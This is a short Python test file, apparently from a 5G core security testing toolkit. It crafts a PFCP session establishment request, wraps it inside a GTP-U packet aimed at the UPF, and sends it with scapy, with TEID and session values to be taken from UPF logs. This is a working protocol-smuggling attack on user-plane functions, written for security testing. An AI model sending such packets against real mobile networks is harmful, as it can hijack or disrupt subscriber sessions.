from __future__ import annotations

from src.attacks.gtp_u.pfcf_in_gtp import pfcp_in_gtp_packet
from src.utils.common import get_my_ip_from_prefix, ip_list
from src.utils.protocols.pfcp.requests import PFCPRequest

from scapy.all import send
    
def test_pfcp_in_gtp():
    
    # Create the encapsulated packet
    pfcp_packet = PFCPRequest.session_establishment(
        src_addr=get_my_ip_from_prefix(),
        dst_addr=ip_list["UPF"],
        ue_addr="12.1.1.3", # have to adjust to upf log
        teid=3, # have to adjust to upf log
        seid=3 # have to adjust to upf log
    )
    
    # Send gtp uplink packet
    packet = pfcp_in_gtp_packet(
        src_addr = get_my_ip_from_prefix(), 
        dst_addr = ip_list["UPF"],
        teid = 2, # have to adjust to upf log
        pfcp_packet = pfcp_packet
    )
    packet.show2()
    send(packet)
    
    # by sniffing the network we should see a association response from the UPF  